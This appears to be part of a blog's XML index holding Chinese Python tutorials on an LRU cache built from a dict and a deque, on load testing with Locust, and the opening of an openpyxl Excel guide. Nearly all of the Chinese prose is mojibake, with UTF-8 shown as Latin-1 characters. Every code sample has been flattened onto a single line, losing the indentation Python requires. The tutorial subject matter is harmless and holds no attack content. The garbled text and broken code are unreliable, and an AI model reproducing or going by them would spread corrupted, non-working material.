å‰è¨€ç”±æ–¼é›»è…¦è¨˜æ†¶é«”ç©ºé–“ï¼ˆmemoryï¼‰çš„é™åˆ¶ï¼Œç„¡æ³•å®¹ç´æ‰€æœ‰è³‡æ–™å’Œæ–‡ä»¶ï¼Œæ‰€ä»¥ç•¶æœ‰æ–°çš„æ–‡ä»¶è¦è¢«ç½®æ›é€²å…¥å¿«å–ï¼ˆcacheï¼‰æ™‚ï¼Œå¿…é ˆæ ¹æ“šä¸€å®šçš„è¦å‰‡ä¾†å–ä»£æ‰é©åˆçš„æ–‡ä»¶ï¼Œé€™å°±æ˜¯æ‰€è¬‚çš„å¿«å–æ–‡ä»¶ç½®æ›æ©Ÿåˆ¶ã€‚
ä¸€èˆ¬ä¾†èªªå¸¸è¦‹çš„å¿«å–æ–‡ä»¶ç½®æ›æ©Ÿåˆ¶æœ‰ï¼š

FIFOï¼ˆFirst In, First Outï¼‰å…ˆé€²å…ˆå‡ºç®—æ³•
LFUï¼ˆLeast Frequently Usedï¼‰æœ€è¿‘æœ€ä¸å¸¸ä½¿ç”¨ç®—æ³•
LRUï¼ˆLeast Recently Usedï¼‰æœ€è¿‘æœ€å°‘ä½¿ç”¨ç®—æ³•
NMRUï¼ˆNot Most Recently Usedï¼‰éæœ€è¿‘ä½¿ç”¨ç®—æ³•

é€šå¸¸æˆ‘å€‘è©•é‡å¿«å–æ©Ÿåˆ¶çš„æŒ‡æ¨™ä¸»è¦æœ‰å…©ç¨®ï¼šå»¶é²ï¼ˆlatencyï¼‰å’Œå‘½ä¸­ç‡ï¼ˆhit rateï¼‰ï¼Œå…¶ä¸­å»¶é²æŒ‡çš„æ˜¯å‘½ä¸­å¾Œå›å‚³å°æ‡‰è³‡æ–™çš„æ‰€èŠ±çš„æ™‚é–“ã€‚è€Œå‘½ä¸­ç‡å‰‡æ˜¯éœ€è¦çš„è³‡æ–™åœ¨å¿«å–ä¸­è¢«æ‰¾åˆ°çš„é »ç‡ã€‚
æœ¬æ–‡å‰‡è¦ä»‹ç´¹ LRUï¼ˆLeast Recently Usedï¼‰é€™å€‹å¸¸è¦‹ç¶“å…¸ç®—æ³•ï¼ˆåœ¨ memcached ä¹Ÿæœ‰ä½¿ç”¨ï¼‰ï¼Œä¸¦ä½¿ç”¨ Python å¯¦ç¾ç°¡å–®çš„ LRU ç®—æ³•ã€‚å…¶æ ¸å¿ƒæ€æƒ³ä¸»è¦å°±æ˜¯å¦‚æœè³‡æ–™æœ€è¿‘æœ‰è¢«ä½¿ç”¨éï¼Œå‰‡æœªä¾†è¢«ä½¿ç”¨çš„æ©Ÿç‡ä¹Ÿæ¯”è¼ƒé«˜ã€‚å¯¦éš›ä¸Šçš„å¯¦ä½œåŸºæœ¬æ¦‚å¿µå°±æ˜¯å¿«å–ä¸€å®šçš„è³‡æ–™é‡ï¼Œè‹¥æ˜¯è¶…éä¸€å®šçš„è³‡æ–™é‡å‰‡æŠŠæœ€è¿‘æœ€å°‘ä½¿ç”¨çš„è³‡æ–™æ·˜æ±°æ‰ã€‚
LRU åŸºæœ¬åŸç†
é—œæ–¼ LRU ç®—æ³•ç”¨ç”Ÿæ´»åŒ–ä¸€é»èªªæ˜å°±åƒæ˜¯å¹³å¸¸è¡£æ¶ç®¡ç†è¡£æœä¸€æ¨£ã€‚æƒ³åƒä½ çš„è¡£æ¶æ˜¯ä¸€å€‹æœ‰é™ç©ºé–“çš„è¡£æ¶ï¼Œè¶Šå¸¸ç©¿çš„è¡£æœé å¤–é¢ã€‚ç•¶æˆ‘å€‘æœ‰æ–°è¡£æœæ™‚æœƒå…ˆå¾å‰é¢æ”¾å…¥ï¼Œè¦ç©¿è¡£æœæ™‚å‰‡æœƒæŠŠæƒ³è¦çš„è¡£æœæ‹¿å‡ºä¾†ä½¿ç”¨ï¼Œæ´—å®Œå¾Œæ”¾åˆ°æœ€å‰é¢ï¼ˆå› ç‚ºæ¯”è¼ƒå¸¸ç©¿ï¼‰ã€‚ç•¶è¡£æœå¤ªå¤šè¶…éè¡£æ¶å¯å®¹ç´ç©ºé–“æ™‚ï¼Œæœ€å¾Œé¢ä¸å¸¸ç©¿çš„è¡£æœå¾è¡£æ¶æ‰ä¸‹å»ï¼Œæ¶ˆå¤±ä¸è¦‹ï¼šP
ä½¿ç”¨ Python å¯¦ç¾ LRU å¿«å–æ–¹æ¡ˆé€šå¸¸æˆ‘å€‘å¸¸æœƒä½¿ç”¨ hash map æ­é… Double Linked List ä¾†å¯¦ä½œï¼ˆset&#x2F;get æ™‚é–“è¤‡é›œåº¦ O(1)ï¼‰ï¼Œé€™æ¨£å¯ä»¥é¿å…å–®ç´”ä½¿ç”¨é™£åˆ—ä¸¦å­˜ counter&#x2F;timestamp çš„æ–¹å¼éœ€è¦ä¸åœç¶­è­· counter æˆ–æ˜¯åªä½¿ç”¨ Linked List å¯¦ä½œï¼Œåœ¨ get å€¼æ™‚æ™‚é–“è¤‡é›œåº¦ç‚º O(n)ï¼Œä¾†çš„åˆé©ã€‚

ä»¥ä¸‹æˆ‘å€‘ä½¿ç”¨ Python Dict (hash map) å’Œ Queue (Double Linked List) ä¾†å¯¦ä½œç°¡å–®çš„ LRU ç®—æ³•ã€‚
å»ºç«‹ä¸€å€‹çµ¦å®šå¤§å°çš„ LRU cache ç³»çµ±ï¼Œä¸¦å¯¦ä½œå…©ç¨®æ“ä½œæ–¹å¼ï¼Œå–å€¼å’Œè¨­å®šå€¼

get(key)ï¼šç•¶ key å°æ‡‰çš„å€¼å­˜åœ¨ cache ç³»çµ±ä¸­æ™‚å›å‚³è©²å€¼ï¼Œä¸¦æŠŠè©²å€¼æ”¾åˆ° cache ç³»çµ±æœ€å‰é¢ï¼Œè‹¥æ²’æœ‰å°æ‡‰å€¼å‰‡å›å‚³ -1
set(key, value)ï¼šç•¶ key ä¸å­˜åœ¨ cache ç³»çµ±ä¸­æ™‚ï¼Œå‰‡å°‡ key, value æ”¾å…¥ cacheï¼Œè‹¥ç³»çµ±å€¼æ»¿å‰‡ç§»é™¤æœ€ä¸å¸¸ä½¿ç”¨çš„ key, value ä¸¦å¡å…¥æ’å…¥æ–°çš„ key, value

from collections import dequeclass LRUCache:    def __init__(self, cache_size):        self.cache_size = cache_size        self.queue = deque()        self.hash_map = dict()        def is_queue_full(self):        return len(self.queue) == self.cache_size        def set(self, key, value):        if key not in self.hash_map:            if self.is_queue_full():                pop_key = self.queue.pop()                self.hash_map.pop(pop_key)                self.queue.appendleft(key)                self.hash_map[key] = value            else:                self.queue.appendleft(key)                self.hash_map[key] = value    def get(self, key):        if key not in self.hash_map:            return -1        else:            self.queue.remove(key)            self.queue.appendleft(key)            return self.hash_map[key]if __name__ == &#x27;__main__&#x27;:    # è¨­å®š cache å¤§å°ç‚º 3    lru_cache = LRUCache(3)    lru_cache.set(&#x27;key1&#x27;, 7)    lru_cache.set(&#x27;key2&#x27;, 2)    lru_cache.set(&#x27;key3&#x27;, 3)    lru_cache.set(&#x27;key4&#x27;, 4)    print(lru_cache.get(&#x27;key2&#x27;))    # è¶…é cache å¤§å°ï¼Œè¢«ä¸Ÿæ£„ï¼Œæ‰€ä»¥ key1 å›å‚³å€¼ç‚º -1    print(lru_cache.get(&#x27;key1&#x27;))    lru_cache.set(&#x27;key1&#x27;, 7)    # key1 å·²å­˜åœ¨ cache ä¸­ï¼Œæ‰€ä»¥ä¸åšä»»ä½•å‹•ä½œ    lru_cache.set(&#x27;key1&#x27;, 2)    print(lru_cache.get(&#x27;key1&#x27;))

ç¸½çµä»¥ä¸Šç°¡å–®ä»‹ç´¹å¦‚ä½•ä½¿ç”¨ Python å¯¦ç¾ LRU å¿«å–æ–¹æ¡ˆï¼Œè‹¥æ˜¯è®€è€…æœ‰èˆˆè¶£çš„è©±å¯ä»¥è‡ªå·±å˜—è©¦ OrderedDict å¯¦ä½œæˆ–æ˜¯é‡å° multi thread é€²è¡Œ cache è®€å¯«æ“ä½œè¨­è¨ˆï¼Œç”šè‡³å¯ä»¥æ¨¡ä»¿ redis æˆ– memcached çµ¦å„²å­˜è³‡æ–™è¿½åŠ  expire timeï¼Œå¯¦ä½œä¸€å€‹ï¼ˆè‡ªå¹¹è¼ªå­ï¼‰æ›´å®Œæ•´çš„ cache ç³»çµ±è§£æ±ºæ–¹æ¡ˆï¼
åƒè€ƒæ–‡ä»¶
å¿«å–æ–‡ä»¶ç½®æ›æ©Ÿåˆ¶

ï¼ˆimage via twimgã€topjavatutorialã€Hacker Noon
ï¼‰
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>cache</tag>
        <tag>LRU</tag>
        <tag>Least Recently Used</tag>
      </tags>
  </entry>
  <entry>
    <title>å¦‚ä½•ä½¿ç”¨ Python å’Œ Locust é€²è¡Œ Load testing å…¥é–€æ•™å­¸</title>
    <url>/2019/05/29/how-to-use-python-locust-to-do-load-testing/</url>
    <content><![CDATA[
å‰è¨€èº«ç‚ºä¸€å€‹é–‹ç™¼è€…åœ¨é–‹ç™¼å®Œ Web æ‡‰ç”¨ç¨‹å¼æ™‚å¾€å¾€æœƒéœ€è¦é€é Load testing å’Œ Profiling è©•ä¼°ç›®å‰ç³»çµ±çš„æ€§èƒ½å’Œæ˜¯å¦éœ€è¦ç¹¼çºŒå„ªåŒ–å’Œä¼°ç®—æ‰€éœ€çš„é‹ç‡Ÿçš„æˆæœ¬ä¸¦äº†è§£ç³»çµ±çš„æ€§èƒ½é‚Šç•Œï¼Œä»¥å»ºç«‹é«˜å¯ç”¨ã€é«˜ç©©å®šæ€§çš„ç¶²è·¯æœå‹™ã€‚ç›®å‰å¸‚é¢ä¸Šæœ‰è¨±å¤šå¯ä»¥ç”¨ä¾†é€²è¡Œ Load testing çš„å·¥å…·ï¼Œä¾‹å¦‚è€ç‰Œçš„ Jemeterã€LoadRunnerã€Apache Benchï¼ˆabï¼‰ã€wrk ç­‰ã€‚è‹¥æ˜¯ä½ æƒ³æ‰¾ä¸€å€‹å¯ä»¥ä¸ç”¨æ“ä½œè¤‡é›œçš„ UI&#x2F;XML å’Œå¯ä»¥ä½¿ç”¨ Python èªæ³•æ’°å¯«æ“ä½œ script çš„è©±ï¼ŒLocust æ˜¯ä¸€å€‹ä¸éŒ¯çš„é¸æ“‡ã€‚æ¥ä¸‹ä¾†å°‡ç°¡å–®ä»‹ç´¹ä¸€ä¸‹ Locust çš„ä½¿ç”¨æ–¹å¼ã€‚
Locust ç°¡ä»‹Locust æœ¬æ„æ˜¯è—èŸ²çš„æ„æ€ï¼Œå…¶å¯¦ä»”ç´°æƒ³æƒ³ï¼Œç•¶å¤§é‡çš„ä½¿ç”¨è€…é€²åˆ°ä½ çš„ç¶²è·¯æœå‹™æ™‚çœŸçš„å°±åƒæ˜¯è—èŸ²å…¥ä¾µä¸€æ¨£ï¼Œç¢ºå¯¦æ˜¯ä¸€å€‹è²¼åˆ‡çš„å·¥å…·åç¨±ã€‚
Locust çš„ä¸»è¦ç‰¹è‰²åœ¨æ–¼ä½¿ç”¨ä¸Šæ–¹ä¾¿ç°¡å–®ï¼š

é€é Plain Python Code å®šç¾©ä½¿ç”¨è€…æ“ä½œè¡Œç‚ºï¼Œä¸ç”¨ä½¿ç”¨ XML æˆ–è¤‡é›œçš„ UI é€²è¡Œæ“ä½œ
æ”¯æ´åˆ†æ•£å¼æ¨¡å¼ï¼Œæ¨¡æ“¬ç™¾è¬ä½¿ç”¨è€…æ“ä½œ
è¨±å¤šçŸ¥åæœå‹™å·²æœ‰ç›¸é—œä½¿ç”¨ç¶“é©—ï¼šBattlefieldï¼ˆæˆ°åœ°é¢¨é›²ï¼‰

ä¸€èˆ¬æˆ‘å€‘åœ¨é€²è¡Œ Load testing æ™‚æœƒæ¯”è¼ƒæ³¨æ„çš„æ˜¯ Response Time å’Œ Throughput çš„è¡¨ç¾ã€‚åœ¨ Locust ä¸­æœƒæä¾› RPSï¼ˆRequest Per Secondï¼Œä¸€èˆ¬ç­‰åŒæ–¼ QPSï¼ŒRPS &#x3D; Request count &#x2F; Response Timeï¼‰å’Œ Response timeï¼ˆclent ç™¼å‡ºè«‹æ±‚åˆ° server è¿”å›æ™‚é–“ï¼‰å’Œ Error rate ç­‰çµ±è¨ˆæ•¸æ“šå’Œåœ–è¡¨å¯ä»¥åƒè€ƒï¼Œé›–ç„¶ç°¡å–®ä½†ä¹Ÿç®—è »å¤ ä½¿ç”¨ã€‚
ç’°å¢ƒå»ºç½®å®‰è£ Locust æœ€ç°¡å–®çš„æ–¹å¼æ˜¯ä½¿ç”¨ pip å®‰è£ï¼Œå…ˆç¢ºèªæœ¬èº«å·²æœ‰ Python å’Œ pip ç’°å¢ƒï¼ˆå»ºè­°å¯ä»¥ä½¿ç”¨ Python3.4 ä»¥ä¸Šï¼‰ï¼Œç„¶å¾Œåœ¨ terminal åŸ·è¡Œä»¥ä¸‹æŒ‡ä»¤ï¼š
$ pip install locustio

ç”±æ–¼ Locust ä¸æ˜¯ä½¿ç”¨ process å’Œ thread è€Œæ˜¯ gevent æä¾›çš„ coroutine å’Œ non-block IO ä¾†å¯¦ç¾ç¶²è·¯ concurrent requestï¼ˆä½µç™¼è«‹æ±‚ï¼‰ã€‚å› æ­¤ä½¿ç”¨å–®å°æ©Ÿå™¨ç†è«–ä¸Šä¹Ÿå¯ä»¥ç”¢ç”Ÿæ•¸åƒçš„ concurrent requestï¼Œè‹¥æ˜¯æ­é…åˆ†æ•£å¼æ¨¡å¼å‰‡å¯ä»¥æ”¯æ´æ›´é«˜çš„ä½µç™¼è«‹æ±‚ã€‚
è‹¥æ˜¯ mac ä½¿ç”¨è€…å¯èƒ½æœƒéœ€è¦å®‰è£ libev ä¾†æ”¯æ´ gevent ä½¿ç”¨ï¼š
$ brew install libev

æ›´å¤šå®‰è£å’Œç’°å¢ƒå»ºåˆ¶å¯ä»¥åƒè€ƒå®˜æ–¹ç¶²ç«™
æ’°å¯«ç¬¬ä¸€å€‹ Locustfileå®Œæˆäº†ç’°å¢ƒè¨­å®šå¾Œï¼Œæ¥ä¸‹ä¾†æˆ‘å€‘å°±å¯ä»¥ä¾†æ’°å¯« Locustfile ä¾†å®šç¾©æˆ‘å€‘è¦æ¨¡æ“¬çš„ä½¿ç”¨è€…è¡Œç‚ºã€‚ä»¥ä¸‹æ˜¯ä¸€å€‹ç°¡å–®ç¯„ä¾‹ï¼ˆlocustfile.pyï¼‰ï¼š
ä¸€èˆ¬ä¾†èªª Locustfile æœƒæœ‰å…©å€‹ä¸»è¦çš„ Class çµ„æˆï¼ˆWebsiteTasksã€WebsiteUserï¼‰ï¼Œå…¶ä¸­ WebsiteTasks ç¹¼æ‰¿ TaskSet è€Œ WebsiteUser ç¹¼æ‰¿ HttpLocustï¼ˆHttpLocust ç¹¼æ‰¿ Locustï¼‰ã€‚æ‰€ä»¥å¯ä»¥çœ‹æˆ Locustfile ä¸»è¦ç‚º Locust å’Œ TaskSet å…©å¤§ Class æ‰€æè¿°ã€‚ç”± TaskSet å®šç¾© Locust é€™ç¾¤ç”¢ç”Ÿå‡ºä¾†çš„è—èŸ²è¦æ€éº¼è¡Œå‹•ã€‚
from locust import HttpLocust, TaskSet, taskclass WebsiteTasks(TaskSet):    def on_start(self):        &quot;&quot;&quot; on_start is called when a Locust start before any task is scheduled &quot;&quot;&quot;        self.login()    def on_stop(self):        &quot;&quot;&quot; on_stop is called when the TaskSet is stopping &quot;&quot;&quot;        self.logout()    def login(self):        self.client.post(&quot;/login&quot;, &#123;&quot;username&quot;:&quot;ellen_key&quot;, &quot;password&quot;:&quot;education&quot;&#125;)    def logout(self):        self.client.post(&quot;/logout&quot;, &#123;&quot;username&quot;:&quot;ellen_key&quot;, &quot;password&quot;:&quot;education&quot;&#125;)    @task(1)    def index(self):        self.client.get(&quot;/&quot;)    @task(2)    def about(self):        self.client.get(&quot;/about&quot;)class WebsiteUser(HttpLocust):    task_set = WebsiteTasks    min_wait = 5000    max_wait = 15000

æˆ‘å€‘åœ¨ä¸Šé¢çš„æª”æ¡ˆå¯ä»¥çœ‹åˆ° WebsiteTasks è£¡é¢å®šç¾©äº† on_start ç‚ºæ¯æ¬¡ WebsiteUser é–‹å§‹ä»»å‹™éœ€è¦åŸ·è¡Œçš„æ­¥é©Ÿï¼ˆon_stop ç‚ºçµæŸï¼‰ï¼Œä¸Šé¢æ˜¯å…ˆé€²è¡Œ post è«‹æ±‚ç™»å…¥ï¼Œæ¥è‘—æˆ‘å€‘å¯ä»¥çœ‹åˆ° @task é€™å€‹ decorator çš„ä½¿ç”¨ï¼Œäº¦å³åœ¨éç¨‹ä¸­è¦åŸ·è¡Œçš„æŒ‡ä»¤ï¼Œå¾Œé¢çš„æ•¸å­—æ˜¯åŸ·è¡Œæ¯”ä¾‹ï¼ˆé€™è£¡æ˜¯ index å’Œ about ä»»å‹™æ˜¯ 1:2 æ¯”ä¾‹åŸ·è¡Œï¼ŒGET &#x2F;about æ¯”ä¾‹æœƒæ˜¯ &#x2F;index å…©å€ï¼‰ï¼Œè‹¥éƒ½æ²’æœ‰å¯«ï¼Œå‰‡é è¨­ç‚º 1:1ã€‚
ç„¶å¾Œæ˜¯ WebsiteUser æˆ‘å€‘å®šç¾©äº† task_set è®“ Locust çŸ¥é“ç•¶ç”¢ç”Ÿ User å¯¦ä¾‹æ™‚è¦åŸ·è¡Œçš„ä»»å‹™ã€‚min_wait å‰‡å®šç¾© max_wait æ¸¬è©¦éç¨‹ä¸­å…©æ¬¡ä»»å‹™çš„é–“éš”ç‚º 5-15 ç§’çš„éš¨æ©Ÿæ•¸ã€‚
è‹¥æ˜¯ç†Ÿæ‚‰ Python è®€è€…å¯ä»¥ç™¼ç¾äº‹å¯¦ä¸Šï¼Œlocust æ˜¯ä½¿ç”¨ Python requests å¥—ä»¶ä¾†è™•ç†ç¶²è·¯è«‹æ±‚ï¼Œæ‰€ä»¥è‹¥æ˜¯ requests æ”¯æ´çš„æ–¹æ³•å¹¾ä¹éƒ½å¯ä»¥ä½¿ç”¨ã€‚
ä½¿ç”¨ GUI æ“ä½œæ’°å¯«å®Œ Locustfile å¾Œçµ‚æ–¼å¯ä»¥æ­£å¼é–‹å§‹ä½¿ç”¨ Locust å•¦ï¼-H ç‚ºè¦æ¸¬è©¦çš„ service host nameä½¿ç”¨ä¸Šä¹Ÿå¾ˆç°¡å–®ï¼Œåªè¦è¼¸å…¥ä»¥ä¸‹æŒ‡ä»¤ï¼Œå°±å¯ä»¥åœ¨ç€è¦½å™¨æ‰“é–‹ï¼šhttp://127.0.0.1:8089 é€²è¡Œæ“ä½œï¼
$ locust -f locustfile.py -H https://www.example.com


å¯ä»¥è¼¸å…¥å¸Œæœ›æ¨¡æ“¬çš„ä½¿ç”¨è€…æ•¸é‡å’Œå¤šå°‘ç§’é”åˆ°é æœŸä½¿ç”¨è€…æ•¸é‡ï¼ˆhatch rateï¼‰ï¼Œè‹¥æ˜¯è¨­å®š 100 å€‹ userï¼Œhatch rate ç‚º 10ï¼Œå°±ä»£è¡¨æœ‰ 10 ç§’æ™‚é–“å¯ä»¥ warm up åˆ° 100 ä½¿ç”¨è€…ã€‚

é–‹å§‹åŸ·è¡Œå¾Œå¯ä»¥çœ‹åˆ°ç›¸é—œçš„å³æ™‚æ•¸æ“šï¼

é¡¯ç¤º RPS å’Œ Response Time çš„æ•¸æ“šåœ–è¡¨ã€‚

è‹¥æ˜¯æœ‰ Failure ç”¢ç”Ÿå°±æœƒé¡¯ç¤ºåœ¨é€™é ã€‚ 

è‹¥æ˜¯å¸Œæœ›çµæŸæ¸¬è©¦å¯ä»¥é»é¸å³ä¸Šè§’çš„ stop é‚„å¯ä»¥åˆ° download data é é¢ä¸‹è¼‰æ¸¬è©¦çš„çµ±è¨ˆè³‡æ–™ csv æª”æ¡ˆã€‚

ä½¿ç”¨ Terminal é€²è¡Œæ“ä½œè‹¥ä½ ä¸æƒ³ä½¿ç”¨åœ–å½¢åŒ–ä»‹é¢ä½ å¯ä»¥ç›´æ¥åœ¨æŒ‡ä»¤ä¸­åŠ ä¸Š â€“no-webï¼Œä¸¦è¨­å®šæ¨¡æ“¬ user æ•¸é‡ï¼ˆ-cï¼‰å’Œ hatch rateï¼ˆ-rï¼‰ä»¥åŠåŸ·è¡Œæ™‚é–“ï¼ˆ-tï¼‰ï¼Œä»¥ä¸‹ç‚º 100 userï¼Œhatch rateï¼š10ï¼ŒåŸ·è¡Œ 10 åˆ†é˜çš„æ¸¬è©¦ï¼š
$ locust -f locustfile.py -H https://www.example.com --no-web -c 100 -r 10 -t 600s

é”åˆ°è¨­å®šåŸ·è¡Œæ™‚é–“å¾Œå°±æœƒè‡ªå·±çµæŸæ¸¬è©¦ï¼Œé¡¯ç¤ºç›¸é—œæ•¸æ“šæ–¼ terminal ä¸­ï¼š
 Name                                                          # reqs      # fails     Avg     Min     Max  |  Median   req/s---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- Total                                                              0     0(0.00%)                                       0.00Percentage of the requests completed within given times Name                                                           # reqs    50%    66%    75%    80%    90%    95%    98%    99%   100%----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


ä½¿ç”¨åˆ†æ•£å¼æ¨¡å¼ï¼ˆDistributedï¼‰æœ‰æ™‚å€™æˆ‘å€‘æœ¬æ©Ÿçš„è³‡æºä¸å¤ æœƒå°è‡´åœ¨é€²è¡Œ load testing æ™‚å¸Œæœ›æ”¯æ´çš„ä½¿ç”¨è€…å’Œ RPS çš„æ•¸é‡æœƒä¸å¦‚é æœŸï¼Œæ­¤æ™‚å°±å¯ä»¥å˜—è©¦ä½¿ç”¨åˆ†æ•£å¼ modeï¼Œå¯ä»¥å…ˆåœ¨ä¸€å€‹ termianl å»å®šç¾© master çš„è¨­å®šä¸¦å•Ÿå‹•ï¼Œç„¶å¾Œåœ¨ terminal æ–°é–‹ tab å»æŠŠ slave åŠ å…¥ï¼Œç•¶ master ç›£è½ slave æ•¸é‡é”åˆ°å®£å‘Šï¼ˆâ€“expect-slavesï¼‰çš„æ™‚å€™å°±æœƒé–‹å§‹åŸ·è¡Œä»»å‹™ï¼ˆè‹¥æ²’æœ‰å‰‡æœƒä¸€ç›´ç­‰å¾…ï¼‰ã€‚
å®£å‘Š master æŒ‡ä»¤ï¼š
$ locust -H https://www.example.com -f locustfile.py --master --expect-slaves=3

é–‹å•Ÿå¦å¤– termianl tab åŸ·è¡Œ slave æŒ‡ä»¤ï¼š
$ locust -H https://www.example.com -f locustfile.py --slave

ç¸½çµä»¥ä¸Šç°¡å–®ä»‹ç´¹å¦‚ä½•ä½¿ç”¨ Python å’Œ Locust é€²è¡Œ Load testingã€‚Locust å¥½è™•åœ¨æ–¼ç°¡å–®å®¹æ˜“ä½¿ç”¨ï¼Œä¸¦å¯ä»¥ä½¿ç”¨ Python æ’°å¯«ç›¸é—œæ¸¬è©¦ï¼Œè€Œä¸ç”¨æ“ä½œè¤‡é›œçš„ UI æˆ–æ˜¯ XML æª”æ¡ˆã€‚è€Œåœ¨ Locust ä¸­æœƒæä¾› RPS å’Œ Response time å’Œ Error rate ç­‰çµ±è¨ˆæ•¸æ“šå’Œåœ–è¡¨å¯ä»¥åƒè€ƒï¼Œé›–ç„¶ç°¡å–®ä½†ä¹Ÿç®—è »å¤ ä½¿ç”¨ã€‚è‹¥æ˜¯æœ‰æ›´é«˜çš„æ•ˆèƒ½éœ€æ±‚å¯ä»¥åƒè€ƒç”¨ golang å¯«çš„å…„å¼Ÿå°ˆæ¡ˆ boomerã€‚é—œæ–¼ Python Locust é€™å€‹æ–¹ä¾¿çš„ Load testing å·¥å…·å°±ä»‹ç´¹åˆ°é€™è£¡ï¼Œæˆ‘å€‘ä¸‹å›è¦‹å›‰ï¼
åƒè€ƒæ–‡ä»¶
How to Use JMeter for Performance &amp; Load Testing
Running Locust distributed
TPSã€QPSã€RPS
æ·±å…¥æµ…å‡ºå¼€æºæ€§èƒ½æµ‹è¯•å·¥å…· Locustï¼ˆä½¿ç”¨ç¯‡ï¼‰

ï¼ˆimage via locustï¼‰
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>Testing</tag>
        <tag>Load testing</tag>
        <tag>Locust</tag>
        <tag>QPS</tag>
        <tag>RPS</tag>
        <tag>Throughput</tag>
        <tag>Response time</tag>
      </tags>
  </entry>
  <entry>
    <title>å¦‚ä½•ä½¿ç”¨ Python ç¨‹å¼æ“ä½œ Excel è©¦ç®—è¡¨</title>
    <url>/2018/10/05/how-to-use-python-manipulate-excel-spreadsheet/</url>
    <content><![CDATA[
å‰è¨€Excel å¹¾ä¹æ˜¯æ‰€æœ‰è·å ´å·¥ä½œè€…æœ€å¸¸ä½¿ç”¨çš„ Office è»Ÿé«”å·¥å…·ï¼Œå°è‡³åŒäº‹é–“è¨‚ä¾¿ç•¶ã€é£²æ–™ï¼Œå¤§åˆ°é€²å‡ºè²¨è¨‚å–®ç®¡ç†ï¼Œæ‡‰æ”¶æ‡‰ä»˜è³¬æ¬¾çš„è²¡å‹™å ±è¡¨ç­‰éƒ½æœ‰å®ƒçš„èº«å½±ã€‚åœ¨ä¸€èˆ¬å·¥ä½œä¸Šï¼Œä½ å¯èƒ½å¸¸å¸¸éœ€è¦åœ¨ä¸åŒè¡¨å–®ä¸­è¤‡è£½è²¼ä¸Šè¨±å¤šçš„æ¬„ä½ï¼Œæˆ–æ˜¯å¾å¹¾ç™¾å€‹åˆ—è¡¨ä¸­æŒ‘é¸å¹¾åˆ—ä¾ç…§æŸäº›æ¢ä»¶ä¾†æ›´æ–°è©¦ç®—è¡¨å…§å®¹ç­‰ã€‚äº‹å¯¦ä¸Šï¼Œé€™äº›å·¥ä½œå¾ˆèŠ±æ™‚é–“ï¼Œä½†å¯¦éš›ä¸Šå»æ²’ä»€éº¼æŠ€è¡“å«é‡ã€‚ä½ æ˜¯å¦æ›¾æƒ³éä½†ä½¿ç”¨ç¨‹å¼èªè¨€ä¾†åŠ å¿«ä½ çš„å·¥ä½œæ•ˆç‡ï¼Œæ¸›è¼•ç‘£ç¢çš„é‡è¤‡æ€§ç„¡èŠå·¥ä½œä½†åˆä¸çŸ¥é“å¦‚ä½•é–‹å§‹ï¼Ÿ
åˆ¥æ“”å¿ƒï¼Œé€™é‚Šæˆ‘å€‘å°±è¦ä½¿ç”¨ Python å’Œ Openyxl é€™å€‹æ¨¡çµ„ï¼Œè®“è®€è€…å¯ä»¥è¼•é¬†ä½¿ç”¨ Python ä¾†è™•ç† Excel è©¦ç®—è¡¨ï¼Œè§£æ±ºå·¥ä½œä¸Šçš„ç¹ç‘£å–®èª¿å·¥ä½œï¼

Excel è©¦ç®—è¡¨åè©ä»‹ç´¹åœ¨æ­£å¼é–‹å§‹ä½¿ç”¨ Python ç¨‹å¼ä¾†æ“ä½œ Excel è©¦ç®—è¡¨å‰æˆ‘å€‘å…ˆä¾†äº†è§£ Excel å¸¸è¦‹åè©ã€‚é¦–å…ˆä¾†è«‡ä¸€ä¸‹åŸºæœ¬å®šç¾©ï¼Œä¸€èˆ¬è€Œè¨€ Excel è©¦ç®—è¡¨æ–‡ä»¶ç¨±ä½œæ´»é ç°¿ï¼ˆworkbookï¼‰ï¼Œè€Œæ´»é ç°¿æˆ‘å€‘æœƒå­˜åœ¨ .xlsx çš„å‰¯æª”åæª”æ¡ˆä¸­ï¼ˆè‹¥æ˜¯æ¯”è¼ƒèˆŠç‰ˆçš„ Excel æœ‰å¯èƒ½æœƒæœ‰å…¶ä»– .xls ç­‰æª”åï¼‰ã€‚åœ¨æ¯å€‹æ´»é ç°¿å¯ä»¥æœ‰å¤šå€‹å·¥ä½œè¡¨ï¼ˆworksheetï¼‰ï¼Œä¸€èˆ¬å°±æ˜¯æˆ‘å€‘å·¥ä½œå¡«å¯«è³‡æ–™çš„å€åŸŸï¼Œå¤šå€‹è³‡æ–™è¡¨ä½¿ç”¨ tab ä¾†é€²è¡Œå€éš”ï¼Œæ­£åœ¨ä½¿ç”¨çš„è³‡æ–™è¡¨ï¼ˆactive worksheetï¼‰ç¨±ç‚ºä½¿ç”¨ä¸­å·¥ä½œè¡¨ã€‚æ¯å€‹å·¥ä½œè¡¨ä¸­ç›´çš„æ˜¯æ¬„ï¼ˆcolumnï¼‰å¾å’Œæ©«çš„æ˜¯åˆ—ï¼ˆrowï¼‰ã€‚åœ¨æŒ‡å®šçš„æ¬„å’Œåˆ—çš„å€åŸŸæ˜¯å„²å­˜æ ¼ï¼ˆcellï¼‰ï¼Œä¹Ÿå°±æ˜¯æˆ‘å€‘è¼¸å…¥è³‡æ–™çš„åœ°æ–¹ã€‚ä¸€æ ¼æ ¼å„²å­˜æ ¼çš„ç¶²æ ¼å’Œå…§å«çš„è³‡æ–™å°±çµ„æˆä¸€ä»½å·¥ä½œè¡¨ã€‚
